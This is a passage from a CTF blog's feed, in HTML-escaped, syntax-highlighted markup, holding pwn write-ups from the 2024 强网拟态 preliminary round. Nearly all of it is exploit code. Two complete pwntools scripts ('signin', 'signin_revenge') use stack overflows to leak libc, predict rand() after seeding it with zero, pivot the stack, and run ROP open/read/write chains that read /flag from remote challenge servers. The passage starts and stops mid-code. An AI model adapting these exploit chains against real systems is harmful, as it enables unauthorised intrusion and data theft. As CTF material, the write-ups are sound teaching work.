punctuation">.</span><span class="token function">chgr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x3024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xd70</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">runc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;round1&quot;&gt;&lt;a href=&quot;#round1&quot; class=&quot;headerlink&quot; title=&quot;round1&quot;&gt;&lt;/a&gt;round1&lt;/h2&gt;&lt;h3 id=&quot;canary-orw&quot;&gt;&lt;a href=&quot;#canary-orw&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024强网拟态初赛pwn方向wp</title>
    <link href="https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/"/>
    <id>https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/</id>
    <published>2024-10-21T13:02:21.000Z</published>
    <updated>2024-10-21T13:09:26.846Z</updated>
    
    <content type="html"><![CDATA[<p>题目：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn</a></p><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>覆盖种子为<code>0</code>之后进行伪随机数绕过，栈迁移到堆上进行<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-4a001b90aa.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401893</span>heap <span class="token operator">=</span> <span class="token number">0x4040E0</span>start <span class="token operator">=</span> <span class="token number">0x4011B0</span>c_libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> heapCtx<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Note: '</span><span class="token punctuation">,</span> heapCtx<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    seed <span class="token operator">=</span> <span class="token number">0</span>    c_libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x12</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> c_libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'code'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004013be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404e00</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> orw_rop<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h2><p>泄露<code>libc</code>地址之后通过<code>environ</code>泄露栈地址，栈迁移到栈前面部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-9c32d4cdb8.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401393</span>start <span class="token operator">=</span> <span class="token number">0x4010B0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3b8</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404500</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> orw_rop<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 